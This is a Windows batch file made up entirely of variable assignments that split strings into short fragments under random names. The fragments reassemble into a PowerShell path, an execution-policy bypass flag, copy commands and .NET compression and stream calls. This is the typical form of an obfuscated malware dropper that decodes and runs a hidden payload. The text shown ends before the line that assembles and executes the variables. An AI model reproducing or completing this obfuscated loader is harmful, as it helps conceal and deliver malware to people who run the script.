@echo off
set "aBAFccAutx=Wi"
set "QUafWrMAly=ws"
set "cmZMJupCYf=rS"
set "dEenIbrRHI=he"
set "FoDFVpMcoG=rs"
set "eIPtoUdHIJ=do"
set "WLJuvyXIrs=32"
set "ueylwTGQuR=xe"
set "pqIUxPepLP=in"
set "ODczvNULVs=co"
set "tjMkdnsINN= C"
set "vmYihNzECt=ow"
set "tHWCoJwQdU=we"
set "FMbdiODsyo=st"
set "BrleTPwwrr= /"
set "rFjvcOCXwA=0\"
set "hcqXLGcPXF=Po"
set "rljrOgTHwA=\W"
set "ZODprrxSzB=we"
set "WwsNTFRSvi=nd"
set "wRKLkhhNRN=po"
set "TVLFoSIgia=s\"
set "CARsQytXjp=py"
set "MXopQOvnuk=Sy"
set "RoJcqjYyRm=ll"
set "lOanQwFxlD=:\"
set "qARRCPDJUm=1."
set "rKxUVhnfQU=.e"
set "VVxrvUcDnr=\v"
set "rfhMVzPfGv=he"
set "HQRgnDbUdL=ll"
set "DWSZEbKNyb=em"
set "oSYCoHImRN=y "
set "lSGsZYoKHV=cd"
set "ePeDkuDHGW= %~dp0"
set "ayfsYMudoI=Bcm."
set "xNInwNjkOI=('l0"
set "LtLXIQkAfn=trea"
set "vZnwwOEIPD=-ep "
set "jGpPBMXyys=.Dis"
set "EBPVmxWPYE=$aHW"
set "mbADDuBFng=$aHW"
set "iAEReEcNoy=sGUc"
set "YIMEYxcLqT=vj0m"
set "xCtbYppUMx=Comp"
set "qpvxbUsmMI=LuYX"
set "ihQWmfTBck=7;$F"
set "zGYRRDUGiR= [Sy"
set "qZSLZpYobU=se()"
set "dRujuoiSFQ=esMa"
set "bfAtABIkNg=brea"
set "JYSaKykvpv=).Sp"
set "xarKOXTtHS=O.Me"
set "LeTQXJSpbU= = ["
set "YqJZdfBWXk='dqR"
set "HfbSeFlPmq=nage"
set "RgoapDVCpo=v4Ir"
set "iQguDNRPhR=);$a"
set "PvVeZaOHGN=();$"
set "faNYVxbTTk=Stre"
